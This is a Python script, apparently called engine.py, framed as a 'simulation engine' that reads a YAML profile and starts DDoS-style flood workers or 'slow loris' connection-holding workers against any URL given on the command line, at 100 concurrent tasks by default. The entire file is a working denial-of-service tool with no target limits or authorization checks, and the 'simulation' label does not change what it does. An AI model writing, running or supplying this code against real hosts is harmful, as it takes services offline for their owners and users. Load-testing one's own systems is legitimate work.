import asyncio
import aiohttp
import yaml
import logging

logger = logging.getLogger("SimulationEngine")

async def ddos_worker(url: str, session: aiohttp.ClientSession):
    while True:
        try:
            await session.get(url)
        except Exception:
            pass

async def slow_loris_worker(url: str):
    async with aiohttp.ClientSession() as session:
        while True:
            try:
                # Send incomplete headers to tie up the connection
                await session.post(url, headers={"X-Partial-Header": "A"}, data="B", timeout=None)
                await asyncio.sleep(15) 
            except Exception:
                pass

async def run_simulation(profile_path: str, target_url: str):
    with open(profile_path, "r") as f:
        profile = yaml.safe_load(f)
    
    attack_type = profile.get("type")
    concurrency = profile.get("concurrency", 100)
    
    logger.info(f"Starting {attack_type} simulation targeting {target_url} with {concurrency} workers")
    
    tasks = []
    if attack_type == "ddos":
        async with aiohttp.ClientSession() as session:
            tasks = [asyncio.create_task(ddos_worker(target_url, session)) for _ in range(concurrency)]
            await asyncio.gather(*tasks)
    elif attack_type == "slow_loris":
        tasks = [asyncio.create_task(slow_loris_worker(target_url)) for _ in range(concurrency)]
        await asyncio.gather(*tasks)

if __name__ == "__main__":
    import sys
    if len(sys.argv) < 3:
        print("Usage: python engine.py <profile_yaml> <target_url>")
    else:
        asyncio.run(run_simulation(sys.argv[1], sys.argv[2]))
